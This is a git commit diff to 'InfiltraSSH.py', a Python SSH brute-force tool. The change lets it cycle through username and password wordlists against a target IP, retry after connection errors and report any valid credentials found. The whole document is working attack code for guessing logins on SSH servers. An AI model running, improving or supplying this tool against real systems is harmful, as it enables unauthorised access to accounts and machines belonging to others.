906f3e52da2b7e0d9b53fd64d274c2fb17ce2cfa
v0id <165805207+0Pa1@users.noreply.github.com>
2024-05-10 12:18:50 +0300

    InfiltraSSH.py

--- InfiltraSSH.py
+++ InfiltraSSH.py
@@ -2,6 +2,7 @@ from pwn import *
 import argparse
 import paramiko
 import ipaddress
+import time
 
 
 # checks if IP provided by user is valid
@@ -16,40 +17,52 @@ def valid_ip(ip):
 def main():
     parser = argparse.ArgumentParser(description='SSH Brute Force tool by 0Pa1.')
     parser.add_argument('-t', '--target', required=True, type=valid_ip, help='Target IP')
-    parser.add_argument('-u', '--username', required=True, help=' Target Username')
-    parser.add_argument('-w', '--wordlist', required=True, help='Full path to password file')
+    parser.add_argument('-u', '--username', help='Target username')
+    parser.add_argument('-U', '--usernames', help='File containing list of usernames')
+    parser.add_argument('-p', '--password', help='Single password')
+    parser.add_argument('-w', '--wordlist', help='Full path to password file')
 
     args = parser.parse_args()
 
+    if not (args.username or args.usernames):
+        parser.error('Either a single username (-u) or a file with usernames (-U) must be provided.')
+    if not (args.password or args.wordlist):
+        parser.error('Either a single password (-p) or a file with passwords (-w) must be provided.')
+
     host = args.target
-    username = args.username
-    password_file_path = args.wordlist
+
+    try:
+        usernames = [args.username] if args.username else open(args.usernames).read().splitlines()
+        passwords = [args.password] if args.password else open(args.wordlist).read().splitlines()
+    except FileNotFoundError as e:
+        print(f'Error: {str(e)}')
+        return
 
     attempts = 0
 
     try:
-        with open(password_file_path, 'r') as password_list:
-            for password in password_list:
+        for username in usernames:
+            for password in passwords:
                 password = password.strip()
                 attempts += 1
-                print(f'[{attempts}] Attempting Password : {password}')
+                print(f'[{attempts}] Attempting Username: {username}, Password: {password}')
 
                 try:
-                    response = ssh(host=host, user=username, password=password, timeout=1)
+                    response = ssh(host=host, user=username, password=password, timeout=5)
                     if response.connected():
-                        print(f'[+] Valid Password : {password}')
+                        print(f'[+] Valid credentials found: Username: {username}, Password: {password}')
                         response.close()
-                        break
+                        return
                     response.close()
                 except paramiko.ssh_exception.AuthenticationException:
-                    print('[X] Invalid Password! \n' + '-' * 10)
+                    print('[X] Invalid credentials! \n' + '-' * 10)
                 except (EOFError, paramiko.ssh_exception.SSHException) as e:
                     print(f'[!] SSH Exception : {str(e)}')
-                    break
-    except FileNotFoundError:
-        print(f'Error : Wordlist {password_file_path} not found.')
+                    time.sleep(10)
+    except KeyboardInterrupt:
+        print('\n[!] Execution interrupted by the user.')
     except Exception as e:
-        print(f'[!] An unexpected error occurred : {str(e)}')
+        print(f'[!] An unexpected error occurred: {str(e)}')
 
 
 if __name__ == '__main__':
